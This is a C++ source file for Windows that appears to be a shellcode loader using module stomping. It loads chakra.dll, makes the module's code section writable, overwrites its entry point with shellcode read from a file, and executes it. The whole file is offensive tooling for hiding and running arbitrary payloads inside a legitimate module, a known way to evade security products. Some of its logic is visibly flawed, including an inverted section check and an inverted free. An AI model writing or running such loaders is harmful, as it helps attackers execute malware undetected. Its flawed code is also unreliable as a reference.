#include <windows.h>
#include <stdio.h>
#include <stdint.h>

typedef VOID ( *ScEntry )( _In_ void* );

auto file_read(
    _In_  const char* file_name,
    _Out_ uint32_t&   file_size
) -> uint8_t* {
    HANDLE   file_handle = { nullptr };
    uint8_t* file_buffer = { nullptr };

    if ( (( file_handle = CreateFileA(
        file_name,
        GENERIC_READ,
        FILE_SHARE_READ,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    ) ) == INVALID_HANDLE_VALUE ) ) {
        printf( "[-] CreateFileW Failed: %lu\n", GetLastError() );
        goto LEAVE;
    }

    if ( ! (( file_size = GetFileSize( file_handle, nullptr ) )) ) {
        printf( "[-] CreateFileW Failed: %lu\n", GetLastError() );
        goto LEAVE;
    }

    file_buffer = static_cast<uint8_t*>( malloc( file_size ) );
    if ( !file_buffer ) {
        printf( "[-] malloc failed: %lu\n", GetLastError() );
        goto LEAVE;
    }

    if ( !ReadFile( file_handle, file_buffer, file_size, nullptr, nullptr ) ) {
        printf( "[-] ReadFile failed: %lu\n", GetLastError() );
        goto LEAVE;
    }

LEAVE:
    if ( file_handle != INVALID_HANDLE_VALUE )
    {
        CloseHandle( file_handle );
    }

    return file_buffer;
}

int main(
    _In_ int    argc,
    _In_ char** argv
) {
    ScEntry               entry       = { nullptr };
    uint8_t*              file_buffer = { nullptr };
    uint32_t              file_length = { 0 };
    uintptr_t             image_base  = { 0 };
    PIMAGE_NT_HEADERS     nt_header   = { nullptr };
    PIMAGE_SECTION_HEADER sec_header  = { nullptr };
    uint32_t              protection  = { 0 };

    if ( argc < 2 ) {
        printf( "[*] %s [shellcode.bin]\n", argv[ 0 ] );
        return 1;
    }

    if ( ! (( file_buffer = file_read( argv[ 1 ], file_length ) )) ) {
        printf( "[-] failed to read shellcode path: %s\n", argv[ 1 ] );
        goto LEAVE;
    }

    printf( "[*] shellcode file @ %p [%d bytes]\n", file_buffer, file_length );

    if ( ! (( image_base = reinterpret_cast<uintptr_t>( LoadLibraryExA( "chakra.dll", nullptr, DONT_RESOLVE_DLL_REFERENCES ) ) )) ) {
        printf( "[-] LoadLibraryA Failed: %ld\n", GetLastError() );
        goto LEAVE;
    }

    printf( "[*] loaded \"chakra.dll\" @ %llx\n", image_base );

    nt_header  = reinterpret_cast<PIMAGE_NT_HEADERS>( image_base + reinterpret_cast<PIMAGE_DOS_HEADER>( image_base )->e_lfanew );
    sec_header = IMAGE_FIRST_SECTION( nt_header );

    for ( int i = 0; i < nt_header->FileHeader.NumberOfSections; i++ ) {
        if ( strcmp( reinterpret_cast<char*>( sec_header[ i ].Name ), ".text" ) != 0 ) {
            break;
        }
    }

    entry      = reinterpret_cast<ScEntry>( image_base + nt_header->OptionalHeader.AddressOfEntryPoint );
    image_base = image_base + sec_header->VirtualAddress;

    printf( "[*] target code section @ %llx [%ld bytes]\n", image_base, sec_header->SizeOfRawData );
    printf( "[*] entry point @ %p \n", entry );

    if ( ! VirtualProtect( reinterpret_cast<LPVOID>( image_base ), sec_header->SizeOfRawData, PAGE_READWRITE, reinterpret_cast<PDWORD>( &protection ) ) ) {
        printf( "[-] VirtualProtect Failed: %ld\n", GetLastError() );
        goto LEAVE;
    }

    memcpy( reinterpret_cast<void*>( entry ), file_buffer, file_length );

    if ( ! VirtualProtect( reinterpret_cast<LPVOID>( image_base ), sec_header->SizeOfRawData, protection, reinterpret_cast<PDWORD>( &protection ) ) ) {
        printf( "[-] VirtualProtect Failed: %ld\n", GetLastError() );
        goto LEAVE;
    }

    puts( "[*] wrote shellcode into target module" );
    printf( "[*] press enter..." );
    getchar();

    entry( nullptr );

LEAVE:
    if ( !file_buffer ) {
        free( file_buffer );
        file_buffer = nullptr;
    }

    return 0;
}
